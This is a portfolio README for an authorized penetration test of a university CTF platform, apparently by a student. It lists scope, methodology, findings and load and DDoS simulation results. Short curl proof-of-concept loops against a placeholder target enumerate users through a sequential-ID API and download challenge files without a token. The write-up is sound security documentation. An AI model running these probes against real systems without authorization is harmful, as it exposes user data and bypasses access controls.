<div align="center">

# 🔐 AUPP CTF Platform — External Penetration Test

**A real-world authorized security assessment of a university-hosted CTF platform**

[![Language](https://img.shields.io/badge/Language-Python%203-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![Shell](https://img.shields.io/badge/Shell-Bash-4EAA25?style=for-the-badge&logo=gnu-bash&logoColor=white)](https://www.gnu.org/software/bash/)
[![Framework](https://img.shields.io/badge/Target-CTFd-FF0000?style=for-the-badge&logo=dependabot&logoColor=white)](https://ctfd.io)
[![CDN](https://img.shields.io/badge/CDN-Cloudflare-F38020?style=for-the-badge&logo=cloudflare&logoColor=white)](https://cloudflare.com)
[![Status](https://img.shields.io/badge/Status-Completed-2E7D32?style=for-the-badge&logo=checkmarx&logoColor=white)](https://github.com)
[![Sessions](https://img.shields.io/badge/Sessions-5-1565C0?style=for-the-badge&logo=buffer&logoColor=white)](https://github.com)

<br/>

> ⚠️ **Confidentiality Notice:** Target identity, finding details, and vulnerability specifics are redacted.
> This repository is for portfolio and methodology documentation only.

</div>

---

## 📋 Overview

A structured external penetration test conducted against a university-hosted Capture-The-Flag (CTF) web platform as part of an authorized security assessment. The engagement was performed under a signed scope document issued by the platform owner, covering the full external attack surface across five dedicated testing sessions.

| Field | Details |
|---|---|
| 🎯 **Assessment Type** | External Black-Box / Grey-Box Penetration Test |
| 📅 **Duration** | April 20–23, 2026 |
| 🔁 **Sessions** | 5 (Application, API, Load, Infrastructure, DDoS Simulation) |
| 📡 **Total Requests** | 4,000+ across all sessions |
| ✅ **Authorization** | Signed scope document — fully authorized engagement |
| 🛠️ **Platform Stack** | Flask-based CTF framework, CDN/WAF, containerized challenges |

---

## 🗂️ Scope

Testing was limited to the externally accessible web platform and its API surface. All testing was performed from a single external machine without use of distributed attack infrastructure.

**✅ In Scope**
- Web application (authenticated and unauthenticated)
- REST API endpoints
- Session and cookie security
- Business logic and access control
- Static file delivery and challenge infrastructure
- HTTP security headers and SSL/TLS configuration
- Availability and load resilience (single-source simulation)

**❌ Out of Scope**
- Internal network / LAN infrastructure
- Physical access
- Social engineering
- Distributed denial-of-service using real botnets

---

## 🧪 Methodology

Testing followed the **OWASP Testing Guide v4** across five progressive sessions.

### 🔍 Session 1 — Reconnaissance & Application Security
- Attack surface mapping and endpoint enumeration
- Unauthenticated and authenticated API testing
- Access control validation
- Challenge infrastructure testing

### 🔐 Session 2 — Authentication & Session Security
- Login brute-force and rate limiting analysis
- Session fixation and cookie security review
- API parameter tampering
- Business logic testing (scoring, hints, flag submission)

### 📈 Session 3 — Load & Stress Testing
- Single-user baseline measurement
- Concurrent user ramp (up to 100 simultaneous users)
- Login endpoint stress testing
- Scoreboard and API endpoint polling under load
- **1,304 HTTP requests** across 6 test scenarios

### 🏗️ Session 4 — Infrastructure & Injection Testing
- HTTP security header analysis
- SSL/TLS configuration review
- SQL injection, NoSQL injection, SSTI testing
- Cross-site scripting (stored, reflected, DOM)
- Subdomain enumeration and DNS analysis
- Sensitive file and directory discovery
- **47 test cases** across 8 categories

### 💥 Session 5 — DDoS / Availability Simulation
- Spike burst test (200 concurrent users)
- Sustained load test (150 users, 60 seconds, 2,141 requests)
- Escalating API endpoint flood (3 waves, 300 requests)
- Slowloris-style slow-header attack (50 connections)
- POST endpoint flood (100 concurrent write requests)
- Post-test full recovery verification

---

## 🛠️ Tools Used

| Tool | Purpose |
|---|---|
| ![curl](https://img.shields.io/badge/curl-073551?style=flat&logo=curl&logoColor=white) | HTTP request crafting and header analysis |
| ![nmap](https://img.shields.io/badge/nmap-0E83CD?style=flat&logo=nmap&logoColor=white) | Port scanning, SSL/TLS enumeration |
| ![Python](https://img.shields.io/badge/Python_3-3776AB?style=flat&logo=python&logoColor=white) | Custom load tester, DDoS simulator (concurrent.futures, threading) |
| ![ffuf](https://img.shields.io/badge/ffuf-black?style=flat&logo=windowsterminal&logoColor=white) | Directory and endpoint bruteforce |
| `dig` / `nslookup` | DNS and subdomain enumeration |
| `mitmproxy` / Browser DevTools | Traffic inspection, cookie analysis |
| `netcat` / `pwntools` | Low-level connection testing |

> All custom scripts were written from scratch for this engagement.

---

## 📊 Findings Summary

**16 findings identified across 5 sessions.**

| Severity | Count | Badge |
|---|---|---|
| Critical | 0 | ![Critical](https://img.shields.io/badge/Critical-0-B71C1C?style=flat) |
| High | 1 | ![High](https://img.shields.io/badge/High-1-E65100?style=flat) |
| Medium | 5 | ![Medium](https://img.shields.io/badge/Medium-5-F57F17?style=flat) |
| Low | 5 | ![Low](https://img.shields.io/badge/Low-5-2E7D32?style=flat) |
| Informational | 5 | ![Info](https://img.shields.io/badge/Informational-5-1565C0?style=flat) |

> 📄 Full finding details, CVSS scores, proof-of-concept commands, and remediation guidance are documented in the confidential report delivered to the client.

### 🗂️ Finding Categories

| Category | Findings |
|---|---|
| 🔑 Access Control | API endpoint authorization gaps |
| 🍪 Session Security | Cookie attribute misconfiguration |
| 🔍 Information Disclosure | Internal infrastructure details exposed via API |
| 🐳 Container Security | Challenge container instability and image exposure |
| 🛡️ HTTP Security Headers | Missing CSP and Permissions-Policy |
| ⚡ Availability | Response degradation under load; API connection pool exhaustion under flood |
| ⚙️ Configuration | HTTP-to-HTTPS redirect missing; robots.txt admin path disclosure |

---

## 🔬 Proof of Concept Samples

> All PoCs use `<TARGET>` as a placeholder for the redacted target domain and `<SESSION>` for authenticated session tokens.

### 📌 F-01 — User Enumeration via Sequential IDs

The `/api/v1/users/{id}` endpoint is publicly accessible without authentication. Sequential IDs allow full participant enumeration.

```bash
for id in $(seq 1 15); do
  echo -n "ID $id: "
  curl -sk https://<TARGET>/api/v1/users/$id \
    | python3 -c "import sys,json; d=json.load(sys.stdin).get('data',{}); print(d.get('name','—'), '|', d.get('score','—'))"
done
```

```
ID 3:  userAdmin   | 0
ID 6:  userChheang | 100
ID 7:  userRita    | 100
ID 8:  userCambo   | 100
```

---

### 📌 F-03 — Challenge File Token Bypass

Any authenticated session can download challenge files without supplying the HMAC token — the signature is not validated server-side.

```bash
# Expected: HTTP 403 without session
curl -sk -o /dev/null -w "%{http_code}" \
  "https://<TARGET>/files/<hash>/challenge-file.c"
# → 403

# Actual: HTTP 200 with session, no token required
curl -sk -o /dev/null -w "%{http_code}" \
  -H "Cookie: session=<SESSION>" \
  "https://<TARGET>/files/<hash>/challenge-file.c"
# → 200  (file returned without token)
```

---

### 📌 F-06 + F-12 — Missing Secure Cookie & No HTTPS Redirect

Session cookie missing the `Secure` attribute, and port 80 serves content without redirecting to HTTPS — creating a cookie interception path.

```bash
# Check cookie attributes
curl -ski https://<TARGET>/login | grep -i set-cookie
# set-cookie: session=<value>; HttpOnly; Path=/; SameSite=Lax
# Secure: MISSING ← vulnerability

# Check HTTP redirect behaviour
curl -sI http://<TARGET>/ | head -3
# HTTP/1.1 200 OK   ← should be 301 redirect to HTTPS
```

---

### 📌 F-11 — Missing Content-Security-Policy Header

No CSP header returned on any endpoint, leaving the platform without browser-level XSS mitigation.

```bash
curl -sI https://<TARGET>/ | grep -i -E "content-security|permissions-policy|x-frame|x-content"
```

```
x-content-type-options: nosniff
x-frame-options: SAMEORIGIN
strict-transport-security: max-age=31536000; includeSubDomains

Content-Security-Policy:  ← ABSENT
Permissions-Policy:       ← ABSENT
```

---

### 📌 F-08 + F-15 — Response Degradation Under Load

Custom Python load tester and DDoS simulator measuring latency at increasing concurrency. At 200 concurrent users, average response time is 10× baseline.

```
Session 3 — Load Test Results
──────────────────────────────────────────────────────
  Baseline (1 user)      avg:   600ms   p95:   900ms
  @ 60 concurrent        avg:  1766ms   p95:  3200ms
  @ 80 concurrent        avg:  2063ms   p95:  3800ms
  @ 100 concurrent       avg:  2406ms   p95:  4285ms   max: 5128ms

Session 5 — DDoS Simulation Results
──────────────────────────────────────────────────────
  T-07  Spike (200 concurrent)
        avg:  4433ms   p95:  6663ms   max:  7165ms   errors: 0.0%

  T-08  Sustained (150 users, 60s — 2141 requests)
        avg:  4359ms   p95:  7157ms   max: 11997ms   errors: 0.0%

  T-09  API Flood (300 requests, 3 escalating waves)
        avg:  9043ms   p95: 35670ms                  errors: 40.0%
        12 × connection pool exhaustion at peak concurrency
```

---

### 📌 T-10 — Slowloris Fully Mitigated ✅

50 Slowloris-style connections blocked entirely by the WAF. Platform remained live.

```bash
# Result: 0/50 connections held — all blocked by WAF

# Post-attack availability check
curl -sk -o /dev/null -w "%{http_code}  %{time_total}s" https://<TARGET>/
# → 200  0.388s
```

---

## ✅ Positive Security Controls Verified

22 controls confirmed correctly implemented, including:

| Control | Result |
|---|---|
| 🔒 Admin panel access control on all routes | ✅ Pass |
| 🔒 CSRF nonce enforcement on all write endpoints | ✅ Pass |
| 🔒 SQL injection, SSTI, NoSQL injection (WAF + ORM) | ✅ Blocked |
| 🔒 XSS stored and reflected | ✅ Blocked |
| 🔒 CORS misconfiguration | ✅ Not vulnerable |
| 🔒 Sensitive file exposure (.env, .git, config) | ✅ Not exposed |
| 🔒 Origin IP behind CDN — not directly reachable | ✅ Protected |
| 🔒 Session invalidated server-side on logout | ✅ Pass |
| 🔒 Score tampering and mass assignment | ✅ Blocked |
| 🔒 Slowloris attack (50/50 connections blocked) | ✅ Mitigated |
| 🔒 Full platform recovery after DDoS simulation | ✅ < 10 seconds |

---

## 💡 Key Takeaway

The platform demonstrated a **strong application security baseline** with no critical vulnerabilities found. The primary risk was **availability under load** — at 100+ concurrent users, response times degraded 4–10× from baseline, and targeted API flooding caused connection pool exhaustion.

These are infrastructure-layer issues with well-defined fixes (Gunicorn worker scaling, Redis caching, Cloudflare rate limiting) rather than application vulnerabilities. The CDN/WAF layer effectively protected against injection attacks, Slowloris, and brute-force.

---

## 📁 Repository Structure

```
📦 AUPP-CTF-Platform-Security-Study-Case
├── 📄 README.md
├── 🐍 scripts/
│   ├── ddos_sim.py       ← DDoS availability simulation (T-07 to T-12)
│   └── loadtest.py       ← Load & stress testing tool (T-01 to T-06)
└── 🚫 .gitignore
```

---

## 📦 Deliverables

- ✅ Session 4 standalone report (DOCX + PDF)
- ✅ Consolidated full report — Sessions 1 to DDoS (DOCX + PDF)
- ✅ DDoS simulation script (`ddos_sim.py`)
- ✅ Load testing script (`loadtest.py`)
- ✅ Session 4 test plan (47 test cases)

---

## 👤 Author

<div align="center">

**Eav Puthcambo (userCambo)**
<br/>
AUPP Cybersecurity Programme
<br/>
American University of Phnom Penh

[![GitHub](https://img.shields.io/badge/GitHub-MoriartyPuth--Labs-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/MoriartyPuth-Labs)

</div>
